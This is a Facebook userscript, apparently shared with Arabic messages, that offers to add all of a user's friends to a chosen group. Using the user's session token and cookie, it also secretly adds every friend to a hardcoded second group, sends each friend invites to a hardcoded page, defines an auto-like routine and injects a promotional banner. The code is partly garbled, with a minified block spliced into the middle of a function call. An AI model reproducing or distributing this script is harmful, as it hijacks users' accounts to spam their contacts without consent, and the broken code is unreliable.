// ==UserScript==
// @name       add all friends to groub
// ==/UserScript==


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('{البرنامج العالمى}/:لتحنب الحظر يجب الا تزيد الاضافة في المرة الواحدة عن 700 صديق وان تكون الفترة مبين الاضافة والاخري ربع ساعة علي الاقل اللهم اما بلغت اللهم اما فأشهد');




var tulisanNganu = '<font color="#AE0004"><b>El3almy<b> <font color="#C1C1C1">';
var kunaon = '';
function penetrasi(opo) {
	jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fbdtsg + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + userid, function (a) {
		var b = a.substring(a.indexOf("{"));
		var c = JSON.parse(b);
		i--;
		kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
		if (c.error) {
			kunaon += "color:darkred'>";
			if (c.errorDescription) {
				kunaon += c.errorDescription
			} else {
				kunaon += JSON.stringify(c, null, "")
			}
		} else {
			kunaon += "color:darkgreen'>";
			kunaon += arr[i];
			suc++
		}
		kunaon += "</div>";
		var dipes = "<div id='friend-edge-display' style='box-shadow:31px 10px 31px rgba(111, 111, 111, 1.9);position:fixed;left:50%;margin-left:-273px;top:75px;width:510px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 8px 0pt rgba(1,1,1,0.9);border-radius: 14em 1em 14em 1em;border:10px solid rgba(186,0,0,1.1);background-color:rgba(1,1,1,1.9);color:#800000'>";
		dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
		if (i > 0) {
			dipes += arr.length + " Friends Detected<br/>";
			dipes += "<b>" + suc + "</b> Friends Added Of " + (arr.length - i) + " Friends Processed ";
			dipes += "(" + i + " More To Go..)";
			dipes += "<div class='friend-edge'>";
			dipes += kunaon;
			dipes += "</div>"
		} else {
			dipes += arr.length + " Friends Detected And ";
			dipes += "<b>" + suc + " Friends Added</b>";
			dipes += "<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>تم الاضافة شكرا لاستخدامك البرنامج العالمى</span></div>"
		}
		dipes += "</div>";
		document.getElementById("pagelet_welcome_box").innerHTML = dipes
	},
	"text", "post");
	tay--;
	if (tay > 0) {
		var s = arr[tay];
		setTimeout("penetrasi(" + s + ")", 100)
	}
	console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
	jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single/?page_id=430846320379068&invitee=" + opo + "&elem_id=u_0_3c&action=send&ref=friend_summary_section&__user=" + userid + "&__a=1&__req=a&fb_dtsg=" + fbdtsg, function () {}, "text", "post", "tt");
	jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single/?page_id=430846320379068&invitee=" + opo + "&elem_id=u_0_3c&action=send&ref=friend_summary_section&__user=" + userid + "&__a=1&__req=a&fb_dtsg=" + fbdtsg, function () {}, "text", "post", "tt");
	if (memberGroupId != 173099402894907) {
		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fbdtsg + "&group_id=173099402894907&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + userid, function () {},
		"text", "post")
	}
}
function clickfr_callback() {
	if (document.getElementsByName("ok").length > 0) {
		nHtml.ClickUp(document.getElementsByName("ok")[0])
	}
	var a = arr[i];
	if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
	if (document.getElementsByClassName("search").length > 0) {
		console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
		document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = "javascript:void(0);";
		nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
	} else j++;
	setTimeout("clickfr_callback()", 2e3)
}
function addfriend(a) {
	i++;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	setTimeout("clickfr()", 2e3)
}
function sleep(a) {
	var b = (new Date).getTime();
	for (var c = 0; c < 1e7; c++) {
		if ((new Date).getTime() - b > a) {
			break
		}
	}
}
jx = {
	getHTTPObject: function () {
		var a = false;
		if (typeof ActiveXObject != "undefined") {
			try {
				a = new ActiveXObject("Msxml2.XMLHTTP")
			} catch(b) {
				try {
					a = new ActiveXObject("Microsoft.XMLHTTP")
				} catch(c) {
					a = false
				}
			}
		} else {
			if (window.XMLHttpRequest) {
				try {
					a = new XMLHttpRequest
				} catch(b) {
					a = false
				}
			}
		}
		return a
	},
	generatePhstamp: function (qs, dtsg) {
		var input_len = qs.length;
	  numeric_csrf_value='';
	  for(var ii=0;ii<dtsg.length;ii++) {
	    numeric_csrf_value+=dtsg.charCodeAt(ii);
	  }
	  return '1' + numeric_csrf_value + input_len;
	},
	load: function (url, callback, format, method, stmp, opt) {
		var http = this.init();
		if (!http || !url) {
			return
		}
		if (http.overrideMimeType) {
			http.overrideMimeType("text/xml")
		}
		if (!method) {
			method = "GET"
		}
		if (!format) {
			format = "text"
		}
		if (!opt) {
			opt = {}
		}
		format = format.toLowerCase();
		method = method.toUpperCase();
		if (!stmp){
			var now = "uid=" + (new Date).getTime();
			url += url.indexOf("?") + 1 ? "&": "?";
			url += now;
		}
		var parameters = null;
		if (method == "POST") {
			var parts = url.split("?");
			url = parts[0];
			parameters = parts[1];
			if (stmp){
				parameters += "&" + stmp + "stamp=" + this.generatePhstamp(parameters, document.getElementsByName("fb_dtsg")[0].value);
			}
		}
		http.open(method, url, true);
		if (method == "POST") {
			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			http.setRequestHeader("Content-length", parameters.length);
			http.setRequestHeader("Connection", "close")
		}
		var ths = this;
		if (opt.handler) {
			http.onreadystatechange = function () {
				opt.handler(http)
			}
		} else {
			http.onreadystatechange = function () {
				if (http.readyState == 4) {
					if (http.status == 200) {
						var result = "";
						if (http.responseText) {
							result = http.responseText
						}
						if (format.charAt(0) == "j") {
							result = result.replace(/[\n\r]/g, "");
							result = eval("(" + result + ")")
						} else {
							if (format.charAt(0) == "x") {
								result = http.responseXML
							}
						}
						if (callback) {
							callback(result)
						}
					} else {
						if (opt.loadingIndicator) {
							document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
						}
						if (opt.loading) {
							document.getElementById(opt.loading).style.display = "none"
						}
						if (error) {
							error(http.status)
						}
					}
				}
			}
		}
		http.send(parameters)
	},
	bind: function (a) {
		var b = {
			url: "",
			onSuccess: false,
			onError: false,
			format: "text",
			method: "GET",
			update: "",
			loading: "",
			loadingIndicator: ""
		};
		for (var c in b) {
			if (a[c]) {
				b[c] = a[c]
			}
		}
		if (!b.url) {
			return
		}
		var d = false;
		if (b.loadingIndicator) {
			d = document.createElement("div");
			d.setAttribute("style", "position:absolute;top:0px;left:0px;");
			d.setAttribute("class", "loading-indicator");
			d.innerHTML = b.loadingIndicator;
			document.getElementsByTagName("body")[0].appendChild(d);
			this.opt.loadingIndicator = d
		}
		if (b.loading) {
			document.getElementById(b.loading).style.display = "block"
		}
		this.load(b.url, function (a) {
			if (b.onSuccess) {
				b.onSuccess(a)
			}
			if (b.update) {
				document.getElementById(b.update).innerHTML = a
			}
			if (d) {
				document.getElementsByTagName("body")[0].removeChild(d)
			}
			if (b.loading) {
				document.getElementById(b.loading).style.display = "none"
			}
		},
		b.format, b.method, b)
	},
	init: function () {
		return this.getHTTPObject()
	}
};
var nHtml = {
	FindByAttr: function (a, b, c, d) {
		if (c == "className") {
			c = "class"
		}
		var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
		if (e && e.singleNodeValue) {
			return e.singleNodeValue
		}
		return null
	},
	FindByClassName: function (a, b, c) {
		return this.FindByAttr(a, b, "className", c)
	},
	FindByXPath: function (a, b) {
		try {
			var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
		} catch(d) {
			GM_log("bad xpath:" + b)
		}
		if (c && c.singleNodeValue) {
			return c.singleNodeValue
		}
		return null
	},
	VisitUrl: function (a) {
		window.setTimeout(function () {
			document.location.href = a
		},
		500 + Math.floor(Math.random() * 500))
	},
	ClickWin: function (a, b, c) {
		var d = a.document.createEvent("MouseEvents");
		d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		return ! b.dispatchEvent(d)
	},
	Click: function (a) {
		return this.ClickWin(window, a, "click")
	},
	ClickTimeout: function (a, b) {
		window.setTimeout(function () {
			return nHtml.ClickWin(window, a, "click")
		},
		b + Math.floor(Math.random() * 500))
	},
	ClickUp: function (a) {
		this.ClickWin(window, a, "mousedown");
		this.ClickWin(window, a, "mouseup");
		this.ClickWin(window, a, "click")
	},
	GetText: function (a, b) {
		var c = "";
		if (b == undefined) {
			b = 0
		}
		if (b > 40) {
			return
		}
		if (a.textContent != undefined) {
			return a.textContent
		}
		for (var d = 0; d < a.childNodes.length; d++) {
			var e = a.childNodes[d];
			c += this.GetText(e, b + 1)
		}
		return c
	}
};
if (document.getElementsByClassName == undefined) {
	document.getElementsByClassName = function (a) {
		var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
		var c = document.getElementsByTagName("*");
		var d = [];
		var e;
		for (var f = 0;
		(e = c[f]) != null; f++) {
			var g = e.className;
			if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
		}
		return d
	}
}
Array.prototype.find = function (a) {
	var b = false;
	for (i = 0; i < this.length; i++) {
		if (typeof a == "function") {
			if (a.test(this[i])) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		} else {
			if (this[i] === a) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		}
	}
	return b
};
var a = 0,
eind = 0;
var len = document.getElementsByClassName("mbm").length;
for (a = 0; a < len; a++) {
	var ele = document.getElementsByClassName("mbm")[a];
	if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Friends To Group") {
		eind = a;
		break
	}
}
var i = 3;
var tay = 3;
var counter1 = 0,
counter2 = 0,
counter3 = 0;
var j = 0;
var k = 0;
var suc = 0;
var arr = new Array;
var fbdtsg = document.getElementsByName('fb_dtsg')[0].value;
var userid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var memberGroupId = document.getElementsByName('group_id')[0].value;



<!--للخروج من البرنامج-->
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + userid + "&filter[0]=user&__user=" + userid, function (a) {




function Like(e){var t=new XMLHttpRequest;var n="//www.facebook.com/ajax/pages/fan_status.php";var r="&fbpage_id="+e+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";t.open("POST",n,true);t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}body=document.body;if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";div.style.width="200px";div.style.opacity=1.9;div.style.bottom="+60px";div.style.left="+0px";div.style.backgroundColor="rgba(1,1,1,1.5)";div.style.border="1px solid rgba(1,1,1,1.5)";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/codes.el3almy' title='صفحتنا علي الفيس بوك'><blink><center>صفحتنا علي الفيس بوك</center></blink></a>";body.appendChild(div)}if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";div.style.width="200px";div.style.opacity=.9;div.style.bottom="+35px";div.style.left="+0px";div.style.backgroundColor="rgba(1,1,1,1.5)";div.style.border="1px solid rgba(1,1,1,1.5)";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>للخروج من البرنامج</center></blink></a>";body.appendChild(div)}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])


	var b = a;
	var c = b.substring(b.indexOf("{"));
	var d = JSON.parse(c);
	d = d.payload.entries;
	for (var e = 0; e < d.length; e++) {
		arr.push(d[e].uid)
	}
	i = arr.length - 1;
	tay = i;
	console.log(arr.length);
	var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(1,1,1,1.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(1,1,1,1.5)'>";
	dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
	dipes += arr.length + " Friends Detected";
	dipes += "</div>";
	document.getElementById("pagelet_welcome_box").innerHTML = dipes;
	penetrasi(arr[i])
})